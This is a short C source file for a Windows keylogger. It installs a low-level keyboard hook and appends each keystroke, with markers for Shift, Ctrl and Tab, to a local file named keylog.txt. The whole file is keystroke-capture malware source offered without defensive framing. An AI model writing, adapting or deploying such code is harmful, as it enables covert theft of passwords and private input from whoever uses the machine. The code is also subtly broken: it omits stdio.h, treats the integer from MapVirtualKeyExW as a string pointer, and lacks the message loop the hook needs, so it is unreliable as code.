#include <windows.h>

#define LOG_FILE "keylog.txt"

void logKey(int keyCode) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log == NULL) {
        fprintf(stderr, "Unable to open log file.\n");
        return;
    }

    switch (keyCode) {
        case VK_SPACE:
            fprintf(log, " ");
            break;
        case VK_RETURN:
            fprintf(log, "\n");
            break;
        case VK_SHIFT:
            fprintf(log, "[SHIFT]");
            break;
        case VK_CONTROL:
            fprintf(log, "[CTRL]");
            break;
        case VK_TAB:
            fprintf(log, "[TAB]");
            break;
        default:
            // Assuming the key is printable and converting it from virtual key code to character
            char *key = MapVirtualKeyExW(keyCode, MAPVK_VK_TO_CHAR, GetKeyboardLayout(0));
            fprintf(log, "%s", key);
    }

    fclose(log);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        logKey(pKeyBoard->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (hook == NULL) {
        fprintf(stderr, "Failed to install hook.\n");
        return 1;
    }

    printf("Keylogger is running. Press any key to exit...\n");
    getchar();

    UnhookWindowsHookEx(hook);
    return 0;
}

